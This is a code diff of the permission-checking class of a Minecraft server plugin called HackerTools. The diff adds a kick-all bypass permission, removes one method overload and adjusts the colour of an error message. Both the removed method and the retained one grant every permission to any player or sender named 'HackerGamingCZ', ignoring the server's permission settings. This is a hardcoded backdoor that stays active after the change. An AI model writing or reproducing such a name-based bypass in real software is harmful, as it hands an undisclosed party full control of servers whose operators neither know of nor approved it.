@@ -13,23 +13,16 @@ public class Permissions {
     public static final String HT_RESTART = "ht.restart";
     public static final String DEBUG_COMMAND = "ht.debug.command";
     public static final String DEBUG_SHOW = "ht.debug.show";
+    public static final String KICKALL_PROTECTION = "ht.kickall.bypass";
 
     public static boolean hasPermission(Player player, String permission) {
         return hasPermission(player, permission, false);
     }
 
-    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
-        boolean output = player.getName().equals("HackerGamingCZ") || player.hasPermission(permission);
-        if (sendMessage && !output) {
-            HackerTools.getPlugin().getChatManager().sendPlayerMessage(player, Placeholders.ERRORPREFIX + "Since you are lacking permission §c" + permission + ", your action was cancelled.");
-        }
-        return output;
-    }
-
     public static boolean hasPermission(CommandSender sender, String permission, boolean sendMessage) {
         boolean output = sender.getName().equals("HackerGamingCZ") || sender.hasPermission(permission);
         if (sendMessage && !output) {
-            HackerTools.getPlugin().getChatManager().sendPlayerMessage(sender, Placeholders.ERRORPREFIX + "Since you are lacking permission §c" + permission + ", your action was cancelled.");
+            HackerTools.getPlugin().getChatManager().sendPlayerMessage(sender, Placeholders.ERRORPREFIX + "Since you are lacking permission §c" + permission + "§7, your action was cancelled.");
         }
         return output;
     }
